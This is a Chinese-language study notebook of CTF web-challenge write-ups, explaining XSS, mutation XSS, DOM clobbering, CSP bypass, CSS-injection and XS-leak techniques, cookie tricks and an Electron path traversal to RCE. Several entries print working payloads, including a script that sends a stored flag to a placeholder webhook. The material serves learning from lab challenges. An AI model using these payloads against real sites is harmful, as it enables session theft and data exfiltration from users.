    - csp meta标签的限制：
        - 必须在`<head>`标签中，若在`<body>`中会被忽略
        - 无法作用于所有在meta标签前的内容（就是定义出来后csp只作用于下面的内容，当前meta标签前定义的东西一律不管）
    - 在HTML5规定中，无法在`<head>`标签前添加任何东西。这么做相当于默认关闭了`<head>`标签并开启`<body>`标签。注释，DTD除外
    - dom clobbering无法绕过`document.querySelector()`配合`===`的过滤
    - chrome禁用了`data:`url的meta标签的重定向
    - 根据html5规定的13.2部分： https://html.spec.whatwg.org/multipage/parsing.html#parsing ，在浏览器决定当前文档的编码格式时，若当前文档的所有内容尚未加载完毕，可以只将编码格式作用于已加载好的第一部分。对于`data:` url，编码格式作用于整个文档（因为这样的文档是一瞬间加载好的）；但对于网络加载的url则不是这样。non-streamed html和streaming html的差别
    - ISO-2022-JP Charset confusion（[forms](https://github.com/ImaginaryCTF/ImaginaryCTF-2024-Challenges-Public/blob/main/Web/forms)也是这个知识点）。配合上一条就可以在这题构造出编码格式的差异：
    ```html
    <html>
	<head>
    	<!-- é - Add a windows-1252 character to make sure early heurstics detect as windows-1252 -->
        <!-- ^[$BNq From this part onwards it is visible only in windows-1252 mode -->
        <script> doSomeEvilStuff();x = new Image(); x.src='https://mywebhook?' + encodeURIComponent(localStorage['flag']); </script>
        <!-- Bunch of junk. Repeat this 3000 times to split amongst multiple packets -->
        <!-- ^[(B After this point, visible in both modes -->
        <meta http-equiv="Content-Security-Policy" content="default-src 'none'">
        <meta charset="iso-2022-jp">
    </head>
    <body></body></html>
    ```
    假如用`data:` url加载这段内容，整个文档瞬间加载完成，浏览器直接用meta标签里定义的`iso-2022-jp`作为编码格式，那么上面那段`<script>`就会被吞掉；但是若用网络加载，我们在中间填充的垃圾内容会增加文档加载的时间，浏览器只能先加载前面的部分，`<script>`内容正常渲染。过了一段时间后才能加载到meta部分，这时才把编码格式换成`iso-2022-jp`，但不会影响之前已经渲染的内容。本来在遇到延迟的meta标签后，浏览器应该重新解析整个文档，但chrome没有，造成了这个差异漏洞
    - 更详细的wp： https://0xalessandro.github.io/posts/sekai 。官方wp： https://blog.ankursundara.com/htmlsandbox-writeup 。补充了一个知识点：从disk cache加载的文档为non-streamed parsing，而从网络加载的文档为streamed parsing。意味着打开同一个文档两次的结果可能会不同（第一次网络加载，第二次走cache）
- [Hiring Platform](https://abdulhaq.me/blog/iron-ctf-2024)
    - xss+dom clobbering。此题的csp为`script-src 'self'`，可用jsonp绕过。如果题目是一个WordPress网站的话，一般都会有JSONP端点，但这个端点源码里是看不到的
    - 利用iframe的srcdoc属性绕过针对innerHTML属性的过滤
    - 如果代码里引用了一个未定义的变量并以此作为if语句的判断条件：
    ```js
    if (some_undefined){
        //...
    }
    ```
    可以用dom clobbering进入if语句分支，如`<a id=some_undefined>`
    - 如果能使用`<input>`标签，就可以控制某个form提交的变量名称和内容。比如有个form的id是`select`，在任意位置加上这句就能添加form字段：
    ```html
    <input type="text" name="remark" value="REMARK" form="select">
    ```
    提交id为select的form后请求参数里会有`remark=REMARK`项
- [Secret Notes](https://abdulhaq.me/blog/iron-ctf-2024)
    - flask内部使用jinja作为模板引擎。在使用`{{ ... }}`插入变量时，jinja会自动转义特殊字符来规避xss。但注意插入标签的属性时需要这样做：
    ```html
    <img class="profile" alt="{{ attr }}">
    ```
    如果去掉引号，变为`alt={{ attr }}`，攻击者可注入空格、引号等字符当作attr，插入xss payload：`\ src/onerror=alert(1)`
    - cookie jar overflow。之前也见过，这里用来挤掉账号登录的cookie，实现logout的效果
    - Cookie Path Precedence。设置cookie时若添加`path=xxx`选项，且前面没有在这个path下设置cookie；下次访问xxx路径时下发的还是这个cookie，无视实际登录时的cookie。比如admin登录账号，拥有admin cookie。但我们在admin登录前提前在路径a下设置了另一个cookie evil。那么admin访问路径a之外的所有路径持有的都是admin cookie，除了路径a。当admin访问a时，持有的cookie是evil
    - 这题比较特别，xss payload长度限制在31个字符，而且admin bot先访问攻击者url再登录网站。题目在`/profile`下有xss payload，登录后自动重定向至`/profile`。目标是窃取admin在`/notes`下的flag。简述wp的思路：准备两个账号，attacker1和attacker2，账号里的xss payload都是`eval(window.name)`。记录下attacker2账号的cookie，称为`ATTACK`。利用csrf使admin登录attacker1账号，设置一个`path=/profile`的cookie，内容为`ATTACK`。接着利用cookie jar overflow登出attacker1账号。按照admin bot的代码逻辑，此时admin bot登录admin账号。注意此时重定向到`/profile`用的是attacker2的cookie，便可以执行提前准备好的窃取notes的payload（访问`/notes`时的cookie还是admin的，不影响拿flag）
- [Beautiful Buttons](https://abdulhaq.me/blog/iron-ctf-2024)
    - css injection泄漏shadow dom里的内容。还是那个熟悉的`:host-context`，之前在IN-THE-SHADOWS里见过。不过这题的csp很严，没法导入任何外部资源，故无法外带数据。因此需要利用Chromium的一个bug，使Chromium进入无限循环然后崩溃。而页面是否崩溃在admin bot页面有回显，借此泄漏出信息
- [Telechat](https://github.com/HeroCTF/HeroCTF_v6/tree/main/Web/Telechat)
    - 题目是一个electron应用+nodejs后端的组合，两者用socket（`socket.io`库）通信。目标是执行根目录下的可执行文件。首先需要拿到xss，以下是xss部分的关键点：
        - 有个很明显的self xss，在本地可以轻松构建payload。但是程序在发送payload到服务器之前会过滤payload
        - bot通过请求服务器拿到消息内容，因此需要以某种方法劫持bot请求的服务器从而绕过过滤，直接从恶意服务器发送xss payload
        - 前端过滤了uuid格式，但后端没有。攻击者可以直接请求后端的`socket.io`服务器从而输入任意格式的“uuid”
        - uuid最终在创建`socket.io` opener的代码里使用（conv_uuid）：
        ```js
        let socket_bot = io(window.electron.api_url,{
            path: "/reviews/"+conv_uuid+"/"
        });
        ```
        既然conv_uuid被攻击者控制，这里便出现了服务端路径穿越
        - `socket.io`内部的实现没有遵循RFC，使用了遵循重定向的库。意味着如果我们能让题目使用的`socket.io`服务器A重定向到我们的恶意`socket.io`服务器B，受害者将与B进行通信
        - 后端服务器的错误实现（将路径直接放到location处）致使攻击者可以进行任意的重定向。在js中，`//`被视为实际的scheme（http 或 https）。发送`GET //heroctf.fr`给后端服务器，会返回`Location: //heroctf.fr`，直接重定向至`/heroctf.fr`，某个受攻击者控制的恶意服务器。此时成功劫持服务器，能使bot执行任意xss payload
    - 当然xss本身是没法实现文件执行的。主要是题目重写了electron应用的下载功能，使得应用在用户下载文件时应用也会把文件内容存储到当前目录。问题是文件名由攻击者控制，于是又出现了一个路径穿越，这次直接是任意文件写。再利用strace得知应用启动时会加载`libX11-xcb.so.1`,于是写一个恶意库文件传上去。最后故意崩溃应用。因为应用重启会加载库文件，所以直接拿到rce
    - 最后是`path.normalize`。这个函数会把一些奇奇怪怪的字符转成`/`，比如`į`
- [SafeNotes 2.0](https://crypto-cat.gitbook.io/ctf-writeups/2024/intigriti/web/safenotes_2)
    - 这题看漏了一个最基本的漏洞：`.replace(/\.\.[\/\\]/g, "")`。经典非递归replace过滤。利用这个漏洞可以实现CSPT（Client-Side Path Traversal）
    - 关于dompurify到底能不能过滤dom clobbering： https://cure53.de/pentest-report_dompurify.pdf 。里面提到dompurify过滤了id却没有过滤name属性。虽然dom clobbering大多利用id属性实现，但某些情况下name属性也可以（结果这题还是用id属性进行clobbering……到底是过滤了还是没有啊？clobber的对象是一个本来就在html里的element（相比于其他题目的无中生有），难道这是不过滤的原因？）
    - 设置`outerHTML`属性一样会触发xss漏洞
- [WorkBreak](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#workbreak)
    - [mass assignment](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)漏洞。简单来说，网站将请求参数与程序里的数据模型进行动态绑定。所以如果不对参数过滤的话，攻击者可以猜内部模型的特殊字段，比如`is_admin`
    - 程序禁止在创建对象A时传tasks字段。但内部使用了`Object.assign`创建对象。所以用`__proto__`就能绕过
    - 另外这题我有一点没看明白。看wp似乎有两个xss点A和B，其中B点需要用postMessage触发。wp的做法是在A点往B点post带出flag的payload。为啥不直接在A点做啊？
- [SAAS](https://game0v3r.vercel.app/blog/wwctf-saas-challenge-writeup)
    - mutation xss。wp提到了这题的黑名单过滤忽略了一些MathML元素（svg和math），这些元素与其他标准html元素的处理方式不同（属于不同的命名空间）。佬的mutation xss实验室： https://kabilan1290.github.io/sniper
    - 此题的payload：`<math><mtext><table><mglyph><style><img/src=x onerror="alert()">`。正常情况下后面的img payload会被看作是style标签里的内容。但是放到dom tree里渲染后，由于`<mglyph>`和`<style>`不允许作为table标签的子标签，两者连带后面img都被移到了table的前面。接着过滤器过滤掉table标签，剩下的img标签突然就“逃逸”出来（似乎和命名空间解析的不同有关，见 https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass ），独自作为payload
    - 最后是个利用url+eval缩短payload的技巧，之前见过。补充其他人的payload： **SAAS**
    - js的`new URL`特性。经过url编码的url也可以正常解析，甚至于往url里塞几个奇怪字符也不影响
    - mxss cheatsheet： https://sonarsource.github.io/mxss-cheatsheet/examples
    - 官方wp： https://abdulhaq.me/blog/saas-mxss-challenge-writeup-from-wwctf-2024
- [Notes](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#notes)
    - 鸡肋的self xss，只有自己才能查看自己的note。突破点是网站使用了java的Apache Struts框架，这个框架竟然能在url里设置访问者的cookie：`/sample.action;jsessionid=[…]`……
    - 非预期解在于report功能直接用了攻击者提供的url，没有过滤。所以提交`file:///var/lib/jetty/browser-state.json`就能看到bot的cookie
- [srcdoc-memos](../../CTF/idekCTF/srcdoc-memos.md)
    - 不对我怎么忘记记这篇了……总之这是一个极为复杂的xss题，不过关键在于`history.back()`引起的不统一性。执行`history.back()`后，iframe的src属性和srcdoc的csp都会遵循history里记录的上一次结果，但iframe的sandbox属性却遵循最新页面的实时结果
    - 如何绕过`window.opener !== null`的检查
    - 类似题目见[Sand Notes](https://hackmd.io/@Solderet/rk2g-kwr1g)。官方wp和关键的`loader.html`见 **Sand Notes**
        - 这题有人尝试用css injection做，搭配ligature fonts和`span:nth-child(n)::-webkit-scrollbar`来泄漏flag（这个技巧见 https://github.com/cgvwzq/css-scrollbar-attack ）。这个方法对non-headless Puppeteer有用，然而headless就不行了。因为headless Puppeteer默认隐藏scrollbar，见 https://github.com/puppeteer/puppeteer/issues/4747
    - 阅读[Secure Letter](https://github.com/emin-skrijelj/CTF-Writeups/blob/main/QnQSec%20CTF%202025/secure-letter-revenge-writeup.md)时发现之前的理解有偏差。利用`history.back()`引起不一致性的前提是浏览器不使用bfcache而是用disk cache，比如一个用`window.open`打开的网页；或者是headless browsers，自动禁用bfcache
- [Cascade Chaos](https://seall.dev/posts/backdoorctf2024)
    - 比赛时找到了这题的dom clobbering，并且成功注入了xss payload。但是题目由两个机器组成，flag不在出现xss的机器上。试了很久发现无论如何都没法访问到另一个机器。以为是自己没搞懂docker间机器的通信问题（如何通信见 https://stackoverflow.com/questions/47648792/communicating-between-different-docker-services-in-docker-compose ），原来是被CORS挡住了
    - 这篇wp是非预期解。flag所在的机器在style处有个注入，闭合style标签后就能注入js payload了。预期解见 **cascade chaos** 。利用`nth-child`和xs leak技巧逐个字符爆破flag
- [blogdog](https://jorianwoltjer.com/blog/p/ctf/x3ctf-blogdog-new-css-injection-xs-leak)
    - css injection（xs leak）+csp bypass。题目的csp为`script-src 'self'; object-src 'none'; img-src 'none'`，参考[官方wp](https://github.com/x3ctf/challenges-2025/blob/main/web/blogdog),只需要用css exfiltration并加载非图片的外部资源即可绕过。比如`@font-face`
    - 一个chromium bug： https://issues.chromium.org/issues/382086298 ，用chrome加载这段css代码会导致加载代码的tab连带着与tab同源（same origin）的所有instance全部崩溃，即使在iframe里也一样。这是因为[Full Site Isolation](https://chromium.googlesource.com/chromium/src/+/main/docs/process_model_and_site_isolation.md#Full-Site-Isolation-site_per_process)机制，同源的所有页面在chrome里都是一个进程
    - 再次验证一个规则：不要手动修改dompurify返回的结果。这题的dompurify设置很严格，dompurify本身也没漏洞。但程序用replace拿掉了purify结果的引号。结果因为replace没加`/g`导致只会拿掉一个引号，剩下的一个引号成功逃逸到css中，导致css injection
    - 一个浏览器的奇怪行为：属性（attribute）`is`没法用Element.removeAttribute移除： https://github.com/jsdom/jsdom/issues/3265 。配合dompurify可以凭空“捏造”出引号：`<p is>`的purify结果（设置为`no attributes allowed`）是`<p is=""></p>`
    - iframe的onload event可以跨源触发。所以只要目标页面可以被iframe，就能测量那个页面加载所需的时间
    - 存储分区（Storage Partitioning）： https://developers.google.com/privacy-sandbox/cookies/storage-partitioning#what_is_storage_partitioning 。当某个网站处于第三方环境，比如iframe，其所有的存储api都会和main origin分离。等于在iframe的网页里用js的localstorage是取不到和主源一样的内容的
    - 感觉wp的构造很有意思，复述一下。构造这样的payload：注入猜测的flag作为css selector，后面加上前面提到的崩溃chrome的css片段。当猜测的flag匹配时会触发那段css，导致这个网站下的所有网页全部崩溃，包括iframe。创建两个iframe（这里第一个iframe一定能加载成功，但第二个iframe有可能在加载时崩溃。佬计算出的完美时间间隔），并操控bot打开上述构造的payload。如果猜测的flag正确，那个加载中的iframe2便会停止加载，无法触发onload event；反之则无事发生。只需观察iframe2是否触发onload即可判断猜测的flag是否正确
    - 其他相关链接：
        - https://gist.github.com/JorianWoltjer/76fdd101a6e89b06b3b047d35fb9bcc0 ：题目用到的泄漏技巧的更普遍poc
        - 常见css injection技巧： https://aszx87410.github.io/beyond-xss/en/ch3/css-injection
        - html浏览器响应测试工具： https://r.jtw.sh
- [SUPER-SECRET-NOTES](https://github.com/delta/PCTF25-Writeups/blob/main/web/Admin-super-secret-notes)
    - CSP注入；服务器允许插入自定义csp。服务器有设置innerHTML的操作，于是可以用`require-trusted-types-for 'script'; report-uri webhook`。设置innerHTML自然需要使用script，而根据csp，任何违反Trusted Types policy的内容（此处是script里的flag）会被报告到webhook上
- [Get Into My Cute Small Planner](https://adamzvara.github.io/writeups/writeups/2025/BITSCTF/Get-Into-My-Cute-Small-Planner.html)
    - 编码绕过dompurify：题目sanitize代码后用base64编码存储结果，用的时候再解码为ascii。这就导致了可以用unicode overflow夹杂一些特殊的字符。见 https://portswigger.net/research/splitting-the-email-atom#unicode-overflows 。比赛的时候我找了一个被解码成ascii后会产生引号的unicode来逃逸出xss payload，现在发现没有wp的做法好。我的方法没法嵌套太多引号
    - 绕过csp `script-src 'self' 'nonce-' 'unsafe-eval' https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js; base-uri 'none'; object-src 'none'`。要求题目中存在一个被csp允许的重定向端点，且重定向的目标也被csp允许（域名相同即可）。比如上面这个csp，虽然允许的其实是`https://cdnjs.cloudflare.com/xxx`，但重定向时会放过所有`https://cdnjs.cloudflare.com`下的资源。利用这点就能导入各种ajax库来执行xss了，比如`angular.js`，再比如`htmx.js`
    - 其他资源
        - https://joaxcar.com/blog/2024/05/16/sandbox-iframe-xss-challenge-solution ：和这题思路很像，多了一个可以用`document.baseURI`访问父iframe的知识点
        - https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs ：利用AngularJS获取xss
        - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf ：何为Script Gadgets
- [Purell](https://jp0x1.github.io/blog/lactf)
    - 一些xss绕过滤技巧
        - 大写属性名
        - `<svg/onload>`内部用html codes也能正常执行。似乎大部分tag都可以？因为`<img>`也有这个特性： https://mh4ck3r0n3.github.io/posts/2025/02/08/purell
- [antisocial-media](https://ensy.zip/posts/2025-lactf-antisocial-media)
    - js `.replace`函数replacement字符串注入。`.replace`函数包含一些special replacement pattern，导致replace不一定只替换参数指定的字符串。例子：
        ```js
        const html = `    
        <script nonce="{{nonce}}">
            const note = {{...notes}};
        `;
        //$`会被替换成被匹配项前面的内容，即 {{...notes}} 前面的所有内容
        const payload = '$`</script>$`""; custom script with nonce! //';
        console.log(html.replace(
                "{{...notes}}",
                `['${payload}']`))
        ```
        输出结果为
        ```html
        <script nonce="{{nonce}}">
            const note = [' 
        <script nonce="{{nonce}}">
            const note = </script> 
        <script nonce="{{nonce}}">
            const note = ""; custom script with nonce! //'];
        ```
        成功得到了有nonce的自定义xss payload。可以用来绕规定script nonce的csp
    - 题目本身算是个self xss。xss payload存储在session里，只能看到自己session里的note。利用同CTF下的其他xss挑战修改bot的cookie即可。wp修改bot的cookie的方法应该是之前也见过的Cookie Path Precedence，指定了特定path的cookie优先级要比没有指定的普遍cookie高
    - 构造极小xss payload。允许多段payload拼在一起，但每段payload都不能超过15字符。关键是利用多行注释`/**/`和`window.name`来存储太长的webhook url
- [Gigachessbased](https://siunam321.github.io/ctf/LA-CTF-2025/web/gigachessbased)
    - 网站使用了[Svelte](https://svelte.dev)框架和[svelte-spa-router](https://www.npmjs.com/package/svelte-spa-router)模块，故路由是[hash-based routing](https://www.npmjs.com/package/svelte-spa-router#hash-based-routing)。hash-based routing的特点是可以通过改变url `#`号后的内容触发某些功能。比如`w.location.replace('<gigachessbased>#/search?q=something')`能在不重加载整个页面的前提下触发搜索`something`的功能
    - 仅能操作url的xs leak。题目在搜索成功时会实施重定向，而失败时则不会。则成功时需要两次requests，失败时只需要一次。故leak方式是[connection pool](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool)
    - 感觉记录一点失败的思路也不错
        - [Scroll to Text Fragment (STTF)](https://developer.mozilla.org/en-US/docs/Web/URI/Reference/Fragment/Text_fragments)：可以用STTF检测浏览器何时进入viewport（浏览器窗口中当前可见的网页部分）。要求攻击目标可以被嵌入iframe中，且内部存在html注入。对于这道题，没有一个条件满足
        - [Navigations](https://xsleaks.dev/docs/attacks/navigations):通过读`history.length`的值区分成功与失败的查询。首先把bot引向攻击者的网站，使其访问目标网站后执行查询。理论上查询成功的重定向会使`history.length`的值会比查询失败时多出1。最后将bot导会攻击者网站来访问`history.length`的值（只有同源才能读取这个值）。结果实测发现fetch向`/search`发的post请求没有被记入到`history.length`中
        - [Max redirects](https://xsleaks.dev/docs/attacks/navigations/#max-redirects):浏览器限制3XX重定向链的最大次数为20。所以可以在攻击者的网站上重定向20-n次，n为目标网站搜索失败时重定向的次数，n+1为成功时的次数。于是搜索成功会实施21次重定向，触发network error。重点在于“重定向链”。实测里访问目标网站得到的是http code 200而不是3XX，链子断了就没用了。而且题目作者还检查了referer
        - [CSS :visited selector](https://xsleaks.dev/docs/attacks/css-tricks):根据 https://jorianwoltjer.com/blog/p/hacking/xs-leaking-flags-with-css-a-ctfd-0day 和 https://varun.ch/posts/history ，可以用css的`:visited` selector来泄漏访问过的网站url。失败的原因和之前一样，fetch发起的post请求不在history里。`:visited`已被修复： https://developer.chrome.com/blog/visited-links
        - [Cross-window Timing Attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks):攻击者可以测量某个页面打开的时间。问题是这题要测量的是重定向的时间而不是页面打开的时间
    - 官方wp和payload
        - https://hackmd.io/@r2dev2/S1P0RYHYke
        - https://github.com/uclaacm/lactf-archive/blob/main/2025/web/gigachessbased
- [Keeper](https://sectt.github.io/writeups/TRXCTF2025/Keeper/README)
    - css injection+xs leak。需要简述一下题目的设置，因为设计比较“奇妙”
        - `/`（GET），若session绑定了一个secret，则展示secret（此处存在html injection）；否则展示一个输入code和username的form，用于提交secret
        - `/get-secret`（GET）:输入username和code后返回secret。每5秒只能访问一次
        - `/set-secret`（POST）：`/`的form的action，用于设置secret。每个session只能设置一次secret
        - `/visit`:(GET/POST):提交访问的url，每分钟只能访问一次。bot会先在主站提交一个随机的code和username，secret为flag，然后访问攻击者提交的任意http/s开头的url
        - session设置为`same-site strict`
        - 针对js的csp非常严格，但css几乎没有限制
    - 题目中的难点
        - “每个session只能设置一次secret”。bot设置完flag后就有了自己的session，而攻击者的payload在绑定自己的session，也没办法在客户端删掉bot的cookie。突破点在于`same-site strict`，跨站请求不会发送cookie。只要post请求来自跨站的form，访问`/set-secret`时就不会有cookie，从而创建一个与payload关联的session并覆盖掉bot原本的cookie
        - 这么做后bot确实可以触发payload，但是原先输入的code又不见了。需要利用bot先提交secret再访问攻击者的url这点，用`history.goto`连续返回两次，回到`/`。此时页面仍然保留着bot输入的code值，同时会展示secret，即攻击者的payload。个人感觉和`srcdoc-memos`的`history.back()`（bfcache）的不统一性有关
        - 用户输入/js api插入的值与通过html标签的属性设置值不同，前者无法诸如`input[value^="0"]`的CSS selector选中。可以用`font-face`与`unicode-range:`（检测到页面中包含某些字符后向定义的url发送请求）解决这点
        - csp过于严格，`font-face`的请求无法跨源到达攻击者的服务器。利用`/get-secret`的rate limit解决。定义`font-face`的资源url为`/get-secret`，随后用`link rel=prefetch`（假如请求的资源返回>=400的状态码，触发error event。比如`429 Too Many Requests`）的xs leak技巧检测`font-face`是否发送了请求
        - 上述方法一次只能检测一个字符。解决办法是定义多个`font-family`，并用CSS animation一个一个触发（同时触发的话`/get-secret`处的oracle就没用了）
        - 上述方法只能得到组成code的字符，得不到顺序。佬选择让bot访问多次并选择只由数字组成的code，然后爆破code字符顺序
    - 以为这个解法已经很聪明了，没想到[官方wp](https://salvatore-abello.github.io/posts/css-exfiltration-under-default-src-self)更天才。前面的部分和上述解法一样，直到`font-face`的部分。由于csp `default-src ‘self’`无法向外部发送请求，佬想了个巨天才的方法：利用connection pool。exp执行的步骤如下（这里省略具体的设置，总结起来太复杂了，直接看作者提供的代码更简单）：
        1. 阻塞255个socket，即向255个不同的origin发送请求，且每个请求耗时极长
        2. 用AbortController阻塞最后一个空闲socket。AbortController的特点在于可以随时终止连接
        3. 请求`zzzzzz.com`。关键在于域名开头的字符位于的字母顺序要尽量低。注意这个请求会被阻塞，因为最多同时用256个socket
        4. 等待`font-face`的资源请求（sleep合适的时间即可）
        5. 操控AbortController终止第二步的连接
        6. 依次向`aaaaaa.com`（保证域名开头的字符的顺序高于第三步的域名即可）发送请求，保证第i号请求加载完成后再发送第i+1号请求
        
        以上步骤的结果：
        - 第5步释放了一个socket，于是chrome会从所有被阻塞的请求中选择优先级最高的连接。此时优先级最高的是`font-face`的资源请求（css的资源请求优先级很高，见 https://web.dev/articles/fetch-priority?hl=en#resource-priority ），因此这个空闲的socket就给了`font-face`
        - `font-face`的请求完成后被堵塞的请求还有两个，第3步的`zzzzzz.com`和第6步的`aaaaaa.com`。a比z小，所以先请求`aaaaaa.com`
        - `aaaaaa.com`的请求完成后又到了`font-face`的请求。重复以上步骤，直到`font-face`中不再有未请求的资源url
        - 因为`font-face`不再发送请求，所以`aaaaaa.com`的请求完成后终于到了第3步的`zzzzzz.com`请求。从最开始到完成`zzzzzz.com`请求的这段时间里，`aaaaaa.com`请求的数量等同于`font-face`的请求数量
        - 最后根据`font-face`的请求数量查找对应的字符即可

        补充一些知识点：
        - 除资源优先级等其他决定优先级的方法外，chrome最底层决定请求的优先级顺序为`port, scheme, host`。即端口80要比端口8080优先级高；host名a比host名z优先级高（字母顺序更高）
        - `font-face`可以指定多个`src:`资源url，浏览器会按顺序请求，直到遇见一个不返回404错误的url或是请求完全部的url。这题利用了这个特点，让css匹配到A时请求3次，B时请求4次……依次类推，然后测量请求的次数，反推对应的字符。因为这个方法依赖的是请求的次数，所以具体请求什么不重要，能连上就行。比如这题请求的就是localhost
- [baby-sandbox](https://github.com/TheRomanXpl0it/TRX-CTF-2025/blob/main/web/baby-sandbox)
    - 非常明显的html注入，目标是泄漏shadow dom里的flag。直接用js是无法访问shadow dom里的内容的，但是可以用`document.execCommand`执行`findstring`来逐字符爆破flag
    - 绕过csp `"default-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'`带出flag的方法为WebRTC
    - 还可以用`window.find`匹配到shadow dom里的内容；题目的csp还可以用meta绕过。见 **Baby Sandbox**
- [An 18 years old bug](https://mizu.re/post/an-18-years-old-bug)
    - firefox的离谱bug，与iframe和页面cache有关。在一个设置了`Cache-Control`的页面下执行以下操作即可触发bug：

        0. `/`路径具有cache，可以通过get参数设置iframe 1的src；iframe 1下还有一个iframe 2，但无法控制其src
        1. 访问`/`并设置iframe的src属性，假设为A
        2. cache当前iframe src为A的页面（访问`/`并随便加一个get参数，不设置src）
        3. 访问`/`并修改iframe的src属性，假设为B
        4. 回到之前cache的网页，`[CTRL] + [R]`或者js调用`location.reload`
        5. 此时网页的dom内显示iframe的src为B，但iframe实际展示的却是A的内容
    - iframe与cache还有个更离谱的bug，会导致页面上的iframe出现“src偏移”：
        - 前两步和上述一致
        - 访问`/`并修改iframe的src属性为任意无效值。比如`about:x`
        - 上述第四步后，iframe 1的src为之前设置的无效值，同时iframe 2展示A的内容（但dom中无法观察到iframe 2的src改为A，而是原本的值）
    - 结合以上两个bug，假如用户可以控制有sandbox的iframe 1的src，且iframe 1下方有一个无法控制src的iframe 2，就能劫持iframe 2渲染的内容。如果iframe 2恰好没有sandbox，等于顺便绕过了sandbox的限制
- [sayMyName](https://fayred.fr/en/writeups/pwnme-ctf-2025-saymyname)
    - 又是一道关于字符集与ISO-2022-JP的题目。虽然说我见了很多次但还是不熟，看到flask的`return Response(render_template(a.html), content_type='text/html')`和`a.html`里没有设定meta都没反应过来
    - a标签的`onfocus`可以利用`#`触发。比如一个a标签的id是b，那么访问`http://c.com/d#b`即可触发
    - 这题的xss注入点在`onfocus`中，且固定含有`document.location="http://a.com"`部分。这个重定向会导致无法执行一些复杂的payload，比如fetch。可以构造`document.location="http://a.com"[0]="#"`来阻止重定向（最后document.location是当前页面加上`#`。没想到这种语法也行）
        - 另一种方法是修改`document.readyState`，见 **sayMyName** 。题目使用`document.readyState`判断是否应该关闭WebDriver。修改后便有了足够的时间
    - python格式化字符串注入漏洞。如果环境含有复杂的模块，比如flask，就能借助这些模块(以更短的payload)拿到os，进而执行命令
        - 有人提到了另一道题目的[wp](https://github.com/jailctf/challenges-2024/tree/master/MMM)，利用格式化字符串漏洞构建无回显的侧信道做法。不过无法应用于这题，服务器无法承受强度这么高的爆破
- [Hack The Bot 1](https://github.com/Phreaks-2600/PwnMeCTF-2025-quals/blob/main/Web/Hack_The_Bot_1)
    - 使用iframe的srcdoc属性绕过xss过滤并提取cookie。srcdoc里的html Entity可以使用`&#num`的形式，`&#xnum`不是必须的
    - 其他解法与非预期解： **Hack The Bot 1**
        - 使用input标签和`oncontentvisibilityautostatechange`属性
        - 非预期解中题目由于nginx配置错误出现了路径穿越漏洞，可以直接走到chrome的文件夹下下载加密的cookie文件。这里记录一下解密的脚本，比赛时搜了好久都没搜到
        - 由于bot在访问url同时（其实是异步）设置cookie，因此还可以用`cookieStore.addEventListener`检测cookie的设置并直接获取其值
- [Hack The Bot 2](https://github.com/Phreaks-2600/PwnMeCTF-2025-quals/blob/main/Web/Hack_The_Bot_2)
    - WebDrivers(xss挑战里常见的bot，如pupeteer)使用Chrome DevTools Protocole（CDP）的api与浏览器进行交互
        - CDP的载体为http，与pupeteer同时在localhost上启动。具体的端口可由`remote-debugging-port`指定，或者由chrome随机指定
        - [devtools API](https://chromedevtools.github.io/devtools-protocol)有很多，这题使用的是`/json/list`，返回有效websocket的列表。可通过返回内容中的`webSocketDebuggerUrl`记录的ws url与调试工具交互。通常情况下这个url有严格的同源策略（SOP），只允许webdriver自身与其交互；但若开启webdriver时指定`--remote-allow-origins=*`，则所有人都可以在得知具体url（url末尾含有不可爆破的随机id）的情况下与其交互
        - 利用devtools可以访问本机文件系统里的文件。用`Page.navigate`配合`file://` url即可
    - 这题同样存在nginx配置错误，允许攻击者访问chrome cache。cache会记录当前用户（webdriver）访问的所有资源（包括devtools api的url），文件名是由特定规则生成的hash
    - 复述一下题目exp
        - 通过nginx配置漏洞访问cache下的`DevToolsActivePort`文件，获取DevTools启动的http端口
        - 通过http访问`/json/list`。由于同源策略问题，我们无法直接获取其内容。但cache这个page后就能利用nginx配置漏洞查看内容了
        - 计算`/json/list`文件名对应的hash后获取其内容，进而得到websocket url
        - 通过websocket访问文件系统中的flag文件
        - 由于完整payload较长，因此可以用另外一个服务器serve完整payload，提交给bot的内容为fetch上述payload并eval执行
- [DNXSS-over-HTTPS](https://mariosk1574.com/posts/kalmar-ctf-2025-dnxss-over-https)
    - 使`dns.google`返回合法的xss payload。用`/resolve`（如果get参数传`ct`可以使google不过滤返回内容）可以解决很多我做题时（用`/dns-query`）遇到的问题
    - 个人解法：**DNXSS-over-HTTPS** 。使用`dns.message`构造raw dns query
        - 这篇[wp](https://mqcybersec.org/writeups/25-kalmar-dnsxssoverhttp)用的也是`/dns-query`，不知道为啥比我顺利很多？
- [KalmarNotes](https://mqcybersec.org/writeups/25-kalmar-kalmarnotes)
    - 比赛时找到了xss注入点，但是拥有session的用户只能查看自己的note，故正常情况下只能是个self xss
    - 题目在`default.vcl`（[Varnish Configuration Language](https://varnish-cache.org/docs/trunk/users-guide/vcl.html)，[Varnish HTTP Cache](https://varnish-cache.org)）文件中定义了缓存规则，用于缓存所有静态资源，如`.png`结尾的资源。漏洞在于应用没有仔细核对查看note的url（`/note/<id>/<type>`）。即使type不在预期范围内也会呈现note的内容。于是可以构造`/note/id/a.png`，在自己的session下使应用缓存页面后再让admin访问。由于缓存的优先级高于应用的逻辑，admin看到的是先前缓存的payload，而不是身份验证失败的authentication failed提示
- [Aurors Archive](https://evangelospro.com/posts/hackthebox---cyberapocalypse-2025-aurors-archive)
    - admin bot设置比较特别的xss题目。开`puppeteer`时设置了`userDataDir`，于是bot每次运行时的cookie都能保留到下一次，有助于编写多段payload
